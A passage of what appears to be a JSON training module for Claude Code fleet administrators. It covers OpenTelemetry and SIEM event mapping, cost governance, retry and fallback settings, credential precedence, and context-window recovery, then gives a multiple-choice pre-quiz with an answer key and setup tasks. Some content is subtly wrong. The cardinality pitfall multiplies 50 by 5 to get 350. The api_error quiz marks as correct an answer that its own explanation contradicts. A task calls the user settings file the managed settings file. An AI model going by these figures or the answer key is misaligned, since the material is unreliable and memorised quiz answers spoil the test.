\"https://siem.corp.example.com:4318/v1/logs\"\n  }\n}\n```\n\n### SIEM detection rule mapping\n\n| Security question | Event name | Key attributes |\n|---|---|---|\n| Which tool calls were allowed or denied, and by what mechanism? | `claude_code.tool_decision` | `decision`, `source` (config/hook/user_permanent/user_temporary/user_abort/user_reject), `tool_name`; `tool_parameters` with `OTEL_LOG_TOOL_DETAILS=1` |\n| Did someone escalate to bypassPermissions mode? | `claude_code.permission_mode_changed` | `from_mode`, `to_mode`, `trigger` (shift_tab/exit_plan_mode/auto_gate_denied/auto_opt_in) |\n| Did a policy hook block an action? | `claude_code.hook_execution_complete` | `num_blocking` > 0, `hook_event`, `hook_name` |\n| Login, logout, auth failure | `claude_code.auth` | `action` (login/logout), `success`, `auth_method`, `error_category` |\n| MCP server connected or failed | `claude_code.mcp_server_connection` | `status` (connected/failed/disconnected), `is_plugin`; `server_name` requires `OTEL_LOG_TOOL_DETAILS=1` |\n| What commands ran in Bash? | `claude_code.tool_result` with `OTEL_LOG_TOOL_DETAILS=1` | `tool_parameters` (contains `full_command`), `tool_input` |\n| Plugin installed from unofficial source | `claude_code.plugin_installed` | `marketplace.is_official` (`\"true\"`/`\"false\"`), `plugin.name`, `marketplace.name` |\n\nThe `prompt.id` attribute on events is a UUID v4 that links all events produced while processing a single user prompt (the user_prompt event, all api_request events, all tool_result events). Use it to reconstruct the full activity chain for a given prompt. Note: `prompt.id` is intentionally excluded from metrics to avoid unbounded cardinality.\n\n### What Claude Code does not emit\n\nClaude Code emits raw event streams only. Anomaly detection, correlation across sessions, baselining, and alerting are the responsibility of your SIEM backend. If your SIEM lacks an OTLP receiver, stand an OpenTelemetry Collector between the fleet and the SIEM and use the Collector's exporters (for example `elasticsearch`, `splunk_hec`, `loki`) to translate."
   },
   {
    "heading": "In-Session Cost & Limit Governance",
    "body": "Individual engineers cannot see the OTel backend, but they can self-diagnose from within the CLI. This is important because per-session cost is driven by context size, model choice, and which skills/plugins/subagents are active — factors the engineer controls.\n\n### `/usage` — the primary diagnostic\n\nFor API users, `/usage` shows a session cost estimate (the Session block) computed from local token counts. The dollar figure is approximate; for billing accuracy use the Console.\n\nFor Pro/Max/Team/Enterprise subscribers, `/usage` shows:\n\n- Plan limits and reset times.\n- A **breakdown by contributor** — skills, subagents, plugins, and individual MCP servers, each shown as a percentage of total session usage.\n- A `d`/`w` toggle between the last 24 hours and last 7 days (computed from local session history on the current machine; usage from other devices is not included).\n\nThe breakdown is what tells you whether a skill that calls an expensive subagent is the source of an unexpectedly high session, or whether an MCP server is making many API calls in background.\n\n### `/context` — what is in the window right now\n\nRun `/context` to see the current context window breakdown, which helps identify what is consuming space before deciding whether to `/compact` or which MCP servers to disable.\n\n### Status line usage indicator\n\nAdd `rate_limits` fields to a custom status line to display remaining quota continuously without running `/usage` manually. In the Desktop app, the usage ring next to the model picker shows the same information graphically.\n\n### Average costs and planning baselines\n\nAcross enterprise deployments, the documented average is approximately **$13 per developer per active day** and **$150–250 per developer per month**, with 90% of users staying below $30 per active day. These figures assume a mix of models and task types. Use a small pilot group to establish your own baseline before wider rollout — model selection (Opus vs. Sonnet vs. Haiku) has the largest single impact on cost.\n\n### Team-level spend caps\n\n- **Console API billing**: set workspace spend limits at `platform.claude.com`. A workspace named \"Claude Code\" is created automatically on first Console authentication; apply a workspace rate limit to cap Claude Code's share of org API rate limits. You cannot create API keys for this workspace — it is exclusively for Claude Code authentication and usage tracking.\n- **Pro/Max subscription**: use `/usage-credits` to set a monthly spend limit on usage credits.\n- **Bedrock/Vertex/Foundry**: these providers do not send cost metrics to Claude Code. Large enterprises have reported using LiteLLM's virtual key spend tracking or native cloud provider cost tagging as alternatives.\n\n### Cost attribution for skills and plugins on the `cost.usage` metric\n\nThe `claude_code.cost.usage` metric carries attribution attributes:\n\n- `skill.name` — the skill active for the request. Built-in and official-marketplace skill names appear verbatim; third-party plugin skill names are replaced with `\"third-party\"` unless `OTEL_LOG_TOOL_DETAILS=1`.\n- `agent.name` — the subagent type. Built-in agent names and official-marketplace plugin agents appear verbatim; other user-defined agents appear as `\"custom\"`.\n- `plugin.name` — the plugin owning the active skill or agent. Official-marketplace names verbatim; third-party as `\"third-party\"`.\n- `mcp_server.name` — the MCP server whose tool ran. Built-in and official-registry names verbatim; user-configured servers as `\"custom\"`.\n- `mcp_tool.name` — the MCP tool that ran, with the same redaction as `mcp_server.name`.\n\nThis lets you write queries like: \"Show total cost broken down by skill over the last 7 days\" to identify which workflow automations are the most expensive to run."
   },
   {
    "heading": "Retries, Capacity & Fallback Resilience",
    "body": "Claude Code has a built-in retry layer and model fallback mechanism. Understanding both is critical for a fleet lead, because the defaults are conservative and may not survive the concurrency peaks of a large team.\n\n### Automatic retry behavior\n\nClaude Code retries transient failures before surfacing an error. The retried conditions include: 5xx server errors, 529 overloaded responses, request timeouts, temporary 429 throttles, and dropped connections. While retrying the spinner shows `Retrying in Ns · attempt x/y`.\n\n| Variable | Default | Notes |\n|---|---|---|\n| `CLAUDE_CODE_MAX_RETRIES` | 10 | Capped at 15 as of v2.1.186. Lowering it surfaces failures faster in scripts. |\n| `API_TIMEOUT_MS` | 600000 (10 min) | Per-request timeout in ms. Raise for slow proxies. |\n| `CLAUDE_CODE_RETRY_WATCHDOG` | unset | Set to `1` in CI/unattended sessions to retry 429 and 529 capacity errors **indefinitely** instead of giving up after `MAX_RETRIES`. |\n\nWhen you see an error on screen, those retries have already been exhausted. The `claude_code.api_error` event fires only after the final failed attempt; the `attempt` attribute records how many tries were made. A value greater than `CLAUDE_CODE_MAX_RETRIES` (default 10) indicates retry exhaustion on a transient error; a lower value indicates a non-retryable 4xx.\n\nAs of v2.1.185, if no data arrives on the stream for 20 seconds, the spinner shows `Waiting for API response · will retry in … · check your network`. This is not a failure — it clears automatically if the connection resumes. Treat repeated occurrences as a network issue, not a capacity issue.\n\n### 529 Overloaded — what it means and how to handle it\n\nA 529 is **not a quota exhaustion** — it does not count against your plan limits. It means the API is at capacity across all users. When this happens Claude Code surfaces:\n\n```\nAPI Error: Repeated 529 Overloaded errors. The API is at capacity — this is usually temporary. Try again in a moment. If it persists, check https://status.claude.com.\n```\n\nThe fastest operational response is `/model` to switch to a different model. Capacity is tracked per model, so Sonnet may be available when Opus is overloaded. Claude Code prompts this switch when one model is under particularly high load, for example: `Opus is experiencing high load, please use /model to switch to Sonnet`.\n\n### Fallback model chains\n\nSet a fallback chain in settings to handle overload automatically:\n\n```json\n{\n  \"fallbackModel\": [\"claude-sonnet-4-6\", \"claude-haiku-4-5\"]\n}\n```\n\nBehavior: when the primary model is overloaded or unavailable, Claude Code tries the next model in the list. Chains are capped at 3 models (extras are ignored). The string `\"default\"` in the list expands to the current default model. **The entire chain is taken from the highest-precedence settings file that sets `fallbackModel` — it does not merge across files.** Set this in managed settings to enforce a fleet-wide fallback policy. You can also pass `--fallback-model sonnet,haiku` at the CLI for a per-session override.\n\n### Rate limit planning by team size\n\nThese are the documented per-user TPM/RPM recommendations for API billing:\n\n| Team size | TPM per user | RPM per user |\n|---|---|---|\n| 1–5 | 200k–300k | 5–7 |\n| 5–20 | 100k–150k | 2.5–3.5 |\n| 20–50 | 50k–75k | 1.25–1.75 |\n| 50–100 | 25k–35k | 0.62–0.87 |\n| 100–500 | 15k–20k | 0.37–0.47 |\n| 500+ | 10k–15k | 0.25–0.35 |\n\nTPM per user decreases with team size because fewer users tend to use Claude Code concurrently in larger organizations. These rate limits apply at the organization level — individual users can temporarily consume more than their calculated share when others are idle. If you anticipate unusually high concurrent usage (for example, live training sessions with large groups), request higher TPM allocations temporarily.\n\nFor `CLAUDE_CODE_RETRY_WATCHDOG=1` in CI, set it in the managed settings `env` section alongside other CI environment variables so it applies to non-interactive sessions without affecting interactive developers."
   },
   {
    "heading": "Auth Precedence & Credential Failures",
    "body": "The single most common support ticket for a Claude Code fleet lead is some variant of: \"I have a valid subscription but it says my organization is disabled.\" In every case the root cause is credential precedence.\n\n### The precedence order (highest wins)\n\n1. Cloud provider credentials — when `CLAUDE_CODE_USE_BEDROCK`, `CLAUDE_CODE_USE_VERTEX`, or `CLAUDE_CODE_USE_FOUNDRY` is set.\n2. `ANTHROPIC_AUTH_TOKEN` environment variable — sent as `Authorization: Bearer`. Use this for LLM gateway/proxy auth.\n3. `ANTHROPIC_API_KEY` environment variable — sent as `X-Api-Key`. **In non-interactive mode (`-p`), this key is always used when present.** In interactive mode, you are prompted once to approve or decline it; your choice is remembered.\n4. `apiKeyHelper` script output — for dynamic or rotating credentials from a vault.\n5. `CLAUDE_CODE_OAUTH_TOKEN` environment variable — a long-lived OAuth token from `claude setup-token`. Use this for CI pipelines where browser login is unavailable.\n6. Subscription OAuth credentials from `/login` — the default for Pro, Max, Team, and Enterprise.\n\nA key set at step 2, 3, or 4 overrides the interactive login at step 6, even if the login is active and valid. This is the mechanism that causes the confusing `org-disabled` and `403` errors.\n\n### The `ANTHROPIC_API_KEY` trap\n\nThe canonical failure scenario:\n\n1. Engineer set `export ANTHROPIC_API_KEY=sk-ant-...` in `~/.bashrc` months ago when testing against a personal Console account.\n2. That Console organization is now disabled or the key is revoked.\n3. The engineer upgrades to a Team subscription and runs `/login` — the login works, but every request still uses the stale key because env vars outrank OAuth.\n4. Claude Code displays:\n\n```\nYour ANTHROPIC_API_KEY belongs to a disabled organization · Unset the environment variable to use your other credentials\nAPI Error: 400 ... This organization has been disabled.\n```\n\n**Fix:**\n```bash\nunset ANTHROPIC_API_KEY          # in current shell\n# Remove from ~/.zshrc, ~/.bashrc, ~/.profile, and any .env files in projects\nclaude                           # relaunch; should use OAuth now\n```\n\nRun `claude auth status` from the shell (or `/status` inside a session) to confirm which credential is active. Tools like `direnv`, dotenv shell plugins, and IDE integrated terminals can load `.env` files silently. Run `env | grep ANTHROPIC` in the same shell as `claude` to find all sources.\n\n### Your organization has disabled API key authentication\n\nThis error means the Console admin has turned off API key auth org-wide. `ANTHROPIC_API_KEY` or an `apiKeyHelper` is still supplying a key, and that key is being rejected by policy. Running `/login` alone does not fix it because the env var takes precedence. The exact message hints at the source:\n\n```\nYour organization has disabled API key authentication · Unset ANTHROPIC_API_KEY to use your claude.ai account instead\nYour organization has disabled API key authentication · Unset the apiKeyHelper setting and run /login to sign in with your claude.ai account\n```\n\nRemove the env var or `apiKeyHelper` first, then `/login`.\n\n### `apiKeyHelper` scripts and refresh behavior\n\n`apiKeyHelper` (a shell command in `settings.json`) is called after **5 minutes** or on HTTP 401 responses. If the script takes longer than **10 seconds**, Claude Code shows a warning notice in the prompt bar. Scripts that call out to a vault with network latency commonly trigger this; cache the token locally with a TTL using `CLAUDE_CODE_API_KEY_HELPER_TTL_MS` to control the refresh interval.\n\n### Diagnosing which credential is active\n\nRun `claude auth status` from the shell to see authentication status as JSON (add `--text` for human-readable output). Inside a running session, run `/status` at any time. For non-interactive sessions, `--debug` logs the active credential at startup.\n\n### Settings placement for credentials\n\n| Location | What to put here | What NOT to put here |\n|---|---|---|\n| Managed settings `env` | `CLAUDE_CODE_USE_BEDROCK=1`, fleet-wide OTel creds | `ANTHROPIC_API_KEY` — per-user keys must not be fleet-wide |\n| `~/.claude/settings.json` (user) | `apiKeyHelper` pointing to a vault script | Raw API keys |\n| `.claude/settings.json` (project) | Project-specific OTel resource attributes | Any credential — these can be committed to git |\n| Shell profile | Nothing — use `apiKeyHelper` instead | `export ANTHROPIC_API_KEY=...` (remove these) |"
   },
   {
    "heading": "Context-Window & Corrupted-Turn Recovery",
    "body": "Context exhaustion and conversation corruption produce superficially similar symptoms — Claude becomes less coherent, starts repeating itself, or refuses to continue — but they require different interventions.\n\n### Diagnosing the condition\n\n**Full or near-full context** presents as:\n- `Prompt is too long` error.\n- Auto-compaction thrashing: `Autocompact is thrashing: the context refilled to the limit...` — compaction succeeded but a file read or tool output immediately refilled the window again. Claude Code stops retrying to avoid wasting API calls on a loop that isn't making progress.\n- Auto-compaction triggered but classifier context exceeded: `Auto mode classifier transcript exceeded context window — falling back to manual approval (try /compact to reduce conversation size)` — in an interactive session this falls back to a manual permission prompt; in non-interactive mode the run aborts because the transcript only grows.\n- Increasingly shallow responses as Claude trades depth for brevity to stay within the window.\n\n**Corrupted transcript** (a rarer condition) presents as:\n- Garbled or mismatched tool-call/tool-result pairs that generate `API Error: 400 due to tool use concurrency issues`.\n- Contradictory claims about what was done in the current turn despite low context usage.\n- Responses of obviously degraded quality that do not improve after `/compact`.\n\n### Recovery decision tree\n\n```\nSymptom: Claude is degraded or erroring\n│\n├─ \"Prompt is too long\" or near-limit token count?\n│  └─ Run /compact first. Optionally: /compact Focus on the diff and open TODOs\n│     Still full? Move the large-file work to a subagent so it gets its own window.\n│     Still thrashing? Run /clear — the prior conversation context is no longer worth keeping.\n│\n├─ \"tool use concurrency issues\" / 400 on tool use mismatch?\n│  └─ This is a corrupted transcript. Use double-tap Escape to restore a prior checkpoint.\n│     If unavailable (non-interactive), start a fresh session. Do not retry /compact.\n│\n└─ Response quality dropped but context is low?\n   └─ Run claude auth status to confirm credential. Run /model to confirm correct model.\n      If fine, a 529 overload may be the cause — try again in a few minutes.\n```\n\n### The thrashing recovery sequence\n\nWhen you see `Autocompact is thrashing`:\n\n1. Ask Claude to read the oversized file in a specific line range rather than the whole file.\n2. Run `/compact` with a focus instruction: `/compact keep only the plan and the diff, drop all raw log output`.\n3. Move the large-file work to a subagent (`claude -p` with a narrow task) so it runs in a separate context window.\n4. If the earlier conversation is no longer needed, run `/clear` to start clean.\n\n### `/compact` vs `/clear` — when to use which\n\n| Command | What it does | When to use it |\n|---|---|---|\n| `/compact` | Summarizes conversation history in place, reducing token count | You need to keep the session going and the earlier context still matters |\n| `/compact <focus>` | Summarizes with an instruction about what to preserve | You want to drop verbose output but keep the plan and code diffs |\n| `/clear` | Discards the entire conversation and starts fresh | The earlier context is stale or the transcript is damaged; cheaper than compaction |\n| Double-tap Escape | Restores code and conversation to a previous checkpoint | Tool-use corruption or a bad direction that needs to be undone |\n\n### Compaction event in OTel\n\nEvery compaction is emitted as `claude_code.compaction` with `trigger` (auto/manual), `pre_tokens`, `post_tokens`, `success`, `duration_ms`, and `error` (when compaction failed). Alert on `success=\"false\"` — failed compactions leave the session at full context and any subsequent prompt will error.\n\nThe `precompute_reuse` attribute (requires v2.1.153+) tells you whether `/compact` reused a background-prepared summary (`\"hit\"`) or computed a fresh one (`\"miss_custom_instructions\"`, `\"miss_hook\"`, `\"miss_not_ready\"`), useful for diagnosing whether auto-compaction is running ahead of manual invocations.\n\n### Non-interactive sessions and context limits\n\nIn `claude -p` (headless) mode, auto-compaction is the only recovery path. If the auto-compaction classifier itself exceeds its context window, the run aborts with `Auto mode classifier transcript exceeded context window`. Keep `-p` prompts focused and avoid accumulating large tool outputs — consider breaking the work into a sequence of shorter `-p` invocations that each start fresh."
   },
   {
    "heading": "Common Pitfalls, Tradeoffs & When to Use What",
    "body": "### OTel vs. hosted dashboard — the decision\n\n| Need | Use |\n|---|---|\n| Team-level adoption trends, PR counts, accept rates | Hosted dashboard (no config) |\n| Per-user token/cost breakdown | OTel `claude_code.cost.usage` + `claude_code.token.usage` |\n| Skill/plugin/agent cost attribution | OTel cost metric with `skill.name`, `agent.name`, `plugin.name` |\n| Real-time audit trail for SIEM | OTel logs exporter + `OTEL_LOG_TOOL_DETAILS=1` |\n| Full conversation replay | `OTEL_LOG_RAW_API_BODIES=file:<dir>` — use only when legally required |\n| Cost by team/cost center | OTel + `OTEL_RESOURCE_ATTRIBUTES` |\n| GitHub PR attribution | Hosted dashboard GitHub integration |\n\n### Pitfalls most leads hit\n\n**1. Forgetting `CLAUDE_CODE_ENABLE_TELEMETRY=1`.**  \nAll other OTel variables are silently ignored without it. The first thing to check when your collector receives nothing.\n\n**2. Static OTel token in managed settings expiring.**  \nUse `otelHeadersHelper` with a vault script for token rotation. Without it, all telemetry silently stops when the static token expires.\n\n**3. High cardinality from session IDs at scale.**  \n50 engineers generating 5 sessions/day = 350 new time series per day. With a 90-day retention window, that is 31,500 active series just from `session.id`. Disable it for cost-metric aggregations with `OTEL_METRICS_INCLUDE_SESSION_ID=false`. Keep it enabled only for the log stream where per-session event correlation matters.\n\n**4. `OTEL_RESOURCE_ATTRIBUTES` value with a space.**  \nThe formatting error is silent — the attribute is either dropped or includes the literal quote characters. Always use underscores or camelCase in values, or percent-encode. Example: `org.name=Johns_Organization` not `org.name=\"John's Organization\"`.\n\n**5. `fallbackModel` not in managed settings.**  \nIf individual users have `fallbackModel` in their personal settings and managed settings also sets it, only the highest-precedence file's value is used — there is no merge. Set it once in managed settings to apply fleet-wide.\n\n**6. `CLAUDE_CODE_RETRY_WATCHDOG=1` in interactive sessions.**  \nIn interactive mode, indefinite retries mean a user who hits a 529 just waits silently. Reserve `RETRY_WATCHDOG` for CI and automation pipelines where a long wait is acceptable.\n\n**7. Interpreting dashboard numbers as precise billing.**  \nBoth the session-local `/usage` estimate and the dashboard contribution counts are approximations. For billing, use the Console billing page. For contribution attribution, remember the 20% rewrite exclusion and the 21-day window mean real impact is likely higher than reported.\n\n**8. Contribution metrics not available for Zero Data Retention organizations.**  \nIf your Enterprise plan has ZDR enabled, the analytics dashboard shows usage metrics only — the GitHub contribution metrics integration is unavailable. This is a hard constraint, not a configuration option.\n\n**9. OTel env vars are not inherited by subprocesses.**  \nA subprocess running its own OTel instrumentation (for example, an OpenTelemetry-instrumented app started by the Bash tool) will not pick up Claude Code's `OTEL_EXPORTER_OTLP_ENDPOINT` or headers. Set those variables directly in the command that starts the subprocess."
   }
  ],
  "preQuiz": [
   {
    "prompt": "Your organization has 45 developers using Claude Code. You open the Console analytics leaderboard and see only 10 names. What is the correct way to get a complete per-user breakdown?",
    "options": [
     "Switch to the Owner view at claude.ai/analytics/claude-code — the leaderboard there shows all users",
     "Use the Export all users button to download a CSV containing all users, not just the top 10",
     "Enable the GitHub analytics toggle, which unlocks full user listings",
     "Grant all users the UsageView permission so each can see their own data, then aggregate manually"
    ],
    "correct": 1,
    "sectionIndices": [
     0
    ],
    "explanation": "The leaderboard intentionally shows only the top 10 users. The 'Export all users' button provides a complete per-user CSV for the full team."
   },
   {
    "prompt": "A developer on your team merged a PR that included 900 lines of code she wrote. Claude Code suggested a 400-line refactor during the session, but she rewrote most of it herself. The GitHub analytics dashboard shows zero Claude-assisted lines for that PR. What is the most likely correct explanation?",
    "options": [
     "The GitHub app was not installed before the PR was merged, so no data was captured for that session",
     "The developer's code was rewritten more than 20% from the Claude suggestion, so those lines are not credited to Claude Code",
     "The PR fell outside the 21-day attribution window because the session started too early",
     "Lock files and generated code were filtered out, which excluded the majority of the counted lines"
    ],
    "correct": 1,
    "sectionIndices": [
     0
    ],
    "explanation": "Code rewritten more than 20% by the developer is not credited to Claude Code. This is a deliberate design choice to count only high-confidence attributions, which means reported numbers are intentional underestimates."
   },
   {
    "prompt": "You set up Claude Code analytics for your GitHub organization. It has been 6 hours and the dashboard shows no contribution data at all. What is the most likely root cause?",
    "options": [
     "Contribution data takes up to 24 hours (sometimes a few days) to appear — this is expected latency",
     "The GitHub analytics toggle was enabled before the Claude GitHub app was installed, so the integration is broken",
     "The analytics feature is only available on Enterprise plans, not Teams",
     "You need to re-authenticate GitHub every 6 hours for data to sync"
    ],
    "correct": 0,
    "sectionIndices": [
     0
    ],
    "explanation": "Contribution data typically appears within 24 hours and sometimes takes a few days to process. An empty dashboard after only 6 hours is within normal expected latency, not a configuration error."
   },
   {
    "prompt": "You want per-user token costs broken down by model for your 30-person team. You check the Team analytics dashboard at claude.ai/analytics/claude-code but find no per-user token cost data. What is the correct approach?",
    "options": [
     "Grant developers the UsageView permission so per-user token data appears in the Console insights view",
     "Configure OpenTelemetry export with CLAUDE_CODE_ENABLE_TELEMETRY=1 — the dashboard does not surface per-user token counts or cost estimates",
     "Enable the GitHub analytics toggle, which unlocks the token cost breakdown tab",
     "Use the /cost command in each developer's session and aggregate the outputs centrally"
    ],
    "correct": 1,
    "sectionIndices": [
     1
    ],
    "explanation": "The analytics dashboard does not surface per-user token counts or cost estimates. OpenTelemetry export is the correct mechanism for per-user cost and token breakdowns, using claude_code.cost.usage and claude_code.token.usage metrics."
   },
   {
    "prompt": "Your team runs Claude Code on AWS Bedrock. You configure OTEL_RESOURCE_ATTRIBUTES=user.email=jdoe@example.com in the managed settings file. After deploying, the OTel metrics show no user.email attribute. What explains this?",
    "options": [
     "user.email is an OAuth-only standard attribute — on Bedrock there is no Claude account identity, so only user.id and session.id populate",
     "Resource attributes set via OTEL_RESOURCE_ATTRIBUTES are ignored on Bedrock; use OTEL_EXPORTER_OTLP_HEADERS instead",
     "The attribute name must be enduser.email, not user.email, to match the OTel semantic convention",
     "OTEL_METRICS_INCLUDE_RESOURCE_ATTRIBUTES defaults to false on Bedrock deployments"
    ],
    "correct": 0,
    "sectionIndices": [
     1
    ],
    "explanation": "On Bedrock/Vertex/Foundry/direct-API there is no Claude account identity — only user.id (anonymous) and session.id populate. user.email is only available for OAuth users. The workaround is to inject enduser.id via OTEL_RESOURCE_ATTRIBUTES manually."
   },
   {
    "prompt": "You configure OTEL_METRIC_EXPORT_INTERVAL=1000 to debug a metrics pipeline issue. The problem is resolved. What must you do before returning to production?",
    "options": [
     "Set OTEL_METRIC_EXPORT_INTERVAL=60000 to restore the 60-second default, because leaving 1s intervals floods the exporter",
     "Delete the variable entirely — any explicit value overrides the safe default and must be removed",
     "Set it to 30000 (30s) as a compromise between freshness and exporter load",
     "No action needed — the 1s interval is rate-limited server-side and won't cause issues"
    ],
    "correct": 0,
    "sectionIndices": [
     1
    ],
    "explanation": "The documentation explicitly warns to only lower export intervals for debugging, then reset them. The production default for metrics is 60000ms (60 seconds). Leaving 1s debug intervals in production floods the exporter."
   },
   {
    "prompt": "You need to audit which Bash commands Claude Code runs for each user. You enable OTEL_LOGS_EXPORTER=otlp and point it at your SIEM. Bash commands are not appearing in the logs. What is missing?",
    "options": [
     "You also need OTEL_LOG_TOOL_DETAILS=1 to capture Bash commands and call arguments on tool_result events",
     "Bash command logging requires OTEL_LOG_RAW_API_BODIES=1 because commands are embedded in the Messages API payload",
     "The grpc exporter protocol is required for tool logging; http/protobuf does not support it",
     "You need CLAUDE_CODE_ENHANCED_TELEMETRY_BETA=1 because Bash command logging is a beta-only feature"
    ],
    "correct": 0,
    "sectionIndices": [
     1
    ],
    "explanation": "OTEL_LOG_TOOL_DETAILS=1 is required to capture MCP server/tool names, Bash commands, and call arguments on tool_result, tool_decision, and mcp_server_connection events. Enabling the logs exporter alone only captures event structure, not tool parameters."
   },
   {
    "prompt": "You need hook execution spans in your distributed traces to debug a pre-tool hook that is occasionally timing out. You set CLAUDE_CODE_ENABLE_TELEMETRY=1 and CLAUDE_CODE_ENHANCED_TELEMETRY_BETA=1 with OTEL_TRACES_EXPORTER configured. Hook spans do not appear. What additional configuration is required?",
    "options": [
     "Set ENABLE_BETA_TRACING_DETAILED=1 and BETA_TRACING_ENDPOINT, and ensure your org is allowlisted for interactive CLI tracing",
     "Set OTEL_LOG_TOOL_DETAILS=1 — hook spans are emitted as log events, not trace spans",
     "Set CLAUDE_CODE_PROPAGATE_TRACEPARENT=1 to enable context propagation into hook subprocesses",
     "Hook spans only appear when using the Agent SDK or headless -p mode, not interactive CLI"
    ],
    "correct": 0,
    "sectionIndices": [
     1
    ],
    "explanation": "Detailed hook spans require ENABLE_BETA_TRACING_DETAILED=1 plus BETA_TRACING_ENDPOINT, and org allowlisting for interactive CLI. Setting ENHANCED_TELEMETRY_BETA alone without these additional flags will not emit hook spans."
   },
   {
    "prompt": "A CI pipeline uses Claude Code for automated code review. Long-running jobs occasionally fail because the API returns 529 Overloaded errors and the process exits after 10 retries. You want the job to wait out capacity constraints rather than fail. What is the correct setting?",
    "options": [
     "Set CLAUDE_CODE_MAX_RETRIES=50 to give the job enough retry budget to outlast capacity constraints",
     "Set CLAUDE_CODE_RETRY_WATCHDOG=1 to make unattended sessions retry 429/529 errors indefinitely instead of failing",
     "Set CLAUDE_CODE_MAX_RETRIES=15 — this is the maximum allowed value and gives the most retries before failure",
     "Set API_TIMEOUT_MS=3600000 to extend the per-request timeout, which prevents 529 errors on slow API responses"
    ],
    "correct": 1,
    "sectionIndices": [
     2
    ],
    "explanation": "CLAUDE_CODE_RETRY_WATCHDOG=1 makes unattended/CI sessions retry 429/529 capacity errors indefinitely. The documentation explicitly recommends this over raising MAX_RETRIES for long runs. MAX_RETRIES is capped at 15 regardless of the value set."
   },
   {
    "prompt": "You set CLAUDE_CODE_MAX_RETRIES=25 in your team's managed settings. How many retries will actually occur before Claude Code gives up on a failing request?",
    "options": [
     "25 — the configured value is used exactly as set",
     "15 — values above 15 are clamped to the maximum",
     "10 — the default is always used when an invalid value is set",
     "Unlimited — MAX_RETRIES only applies to non-capacity errors; 529s always retry indefinitely"
    ],
    "correct": 1,
    "sectionIndices": [
     2
    ],
    "explanation": "CLAUDE_CODE_MAX_RETRIES is capped at 15. Values above 15 are clamped to 15. To get indefinite retries for capacity errors in CI, use CLAUDE_CODE_RETRY_WATCHDOG=1 instead."
   },
   {
    "prompt": "You query your OTel backend and see a spike in claude_code.api_error events. A developer reports that Claude Code showed 'Retrying in 8s · attempt 3/10' before eventually succeeding. How many api_error events should you expect to see in your backend for that session?",
    "options": [
     "3 — one event per retry attempt so you can track the retry progression",
     "1 — api_error fires only after retries are exhausted; intermediate retries are not separate events",
     "0 — the session succeeded, so no api_error is emitted even if retries occurred",
     "10 — all retry slots are counted as errors even if the request ultimately succeeds"
    ],
    "correct": 1,
    "sectionIndices": [
     1
    ],
    "explanation": "claude_code.api_error fires only after retries are exhausted (terminal). Intermediate retries are not separate events — you track retry count via the attempt attribute on the final error event. A session that eventually succeeds emits no api_error."
   },
   {
    "prompt": "You want to slice your OTel cost metrics by engineering department and cost center without inflating per-datapoint cardinality. Which configuration achieves this?",
    "options": [
     "Set OTEL_RESOURCE_ATTRIBUTES=department=engineering,cost_center=eng-123 and OTEL_METRICS_INCLUDE_RESOURCE_ATTRIBUTES=false so attributes appear only in the OTLP resource block, not as per-datapoint labels",
     "Set OTEL_RESOURCE_ATTRIBUTES=department=engineering,cost_center=eng-123 and leave OTEL_METRICS_INCLUDE_RESOURCE_ATTRIBUTES at its default (true) so they appear as queryable labels on every datapoint",
     "Add department and cost_center as standard OTel semantic attributes via OTEL_EXPORTER_OTLP_HEADERS",
     "Use OTEL_METRICS_INCLUDE_SESSION_ID=false and OTEL_METRICS_INCLUDE_ACCOUNT_UUID=false to free up cardinality budget for department labels"
    ],
    "correct": 0,
    "sectionIndices": [
     1
    ],
    "explanation": "Setting OTEL_METRICS_INCLUDE_RESOURCE_ATTRIBUTES=false moves custom attributes to the OTLP resource block only (not per-datapoint labels), which reduces cardinality while still allowing slicing at the resource level. The default (true) puts them as per-datapoint labels, which enables finer slicing but increases cardinality."
   },
   {
    "prompt": "You use a custom ANTHROPIC_BASE_URL proxy for your team. You have distributed tracing configured but parent spans from upstream services are not propagating into Claude Code traces. What setting enables context propagation through the proxy?",
    "options": [
     "Set CLAUDE_CODE_PROPAGATE_TRACEPARENT=1 — propagation through a custom base URL proxy is off by default",
     "Set OTEL_PROPAGATORS=tracecontext,baggage — the default propagator list excludes W3C TraceContext when a custom endpoint is used",
     "Propagation through custom proxies is not supported; you must use the native Anthropic API endpoint for distributed tracing",
     "Set ENABLE_BETA_TRACING_DETAILED=1 — traceparent propagation requires the detailed tracing beta flag"
    ],
    "correct": 0,
    "sectionIndices": [
     1
    ],
    "explanation": "When using a custom ANTHROPIC_BASE_URL proxy, traceparent propagation is off by default. Setting CLAUDE_CODE_PROPAGATE_TRACEPARENT=1 enables W3C traceparent context propagation through the proxy to connect Claude Code spans to upstream traces."
   }
  ],
  "tasks": [
   {
    "id": "stage-10-task-otel-local",
    "afterSectionIdx": 4,
    "title": "Wire up a local OpenTelemetry collector and verify cost metrics are flowing",
    "instructions": "**Prerequisites:** Docker installed, Claude Code v2.1+ installed.\n\n1. Clone the monitoring guide repo:\n```bash\ngit clone https://github.com/anthropics/claude-code-monitoring-guide /tmp/cc-monitoring\ncd /tmp/cc-monitoring\n```\n\n2. Start the Docker Compose stack (Prometheus + OTel Collector + Grafana):\n```bash\ndocker compose up -d\n```\n\n3. Add telemetry config to your **managed settings file** so it applies fleet-wide (not user-overridable). Edit `~/.claude/settings.json`:\n```json\n{\n  \"env\": {\n    \"CLAUDE_CODE_ENABLE_TELEMETRY\": \"1\",\n    \"OTEL_METRICS_EXPORTER\": \"otlp\",\n    \"OTEL_LOGS_EXPORTER\": \"otlp\",\n    \"OTEL_EXPORTER_OTLP_PROTOCOL\": \"http/protobuf\",\n    \"OTEL_EXPORTER_OTLP_ENDPOINT\": \"http://localhost:4318\",\n    \"OTEL_LOG_TOOL_DETAILS\": \"1\"\n  }\n}\n```\n\n4. Run a short Claude Code session to generate telemetry:\n```bash\nclaude -p \"What is 2+2? Answer in one word.\"\n```\n\n5. Verify metrics are arriving at the Prometheus endpoint:\n```bash\ncurl -s http://localhost:9090/api/v1/query?query=claude_code_cost_usage_total | python3 -m json.tool\n```\n\n6. Open Grafana at http://localhost:3000 (admin/admin) and check the Claude Code dashboard for cost and token data.",
    "doneWhen": "The Prometheus query for claude_code_cost_usage_total returns a non-empty result array, confirming that cost metrics from your Claude Code session are reaching the local OTel collector."
   },
   {
    "id": "stage-10-task-multi-team-attribution",
    "afterSectionIdx": 4,
    "title": "Configure per-team cost attribution labels in OTel resource attributes",
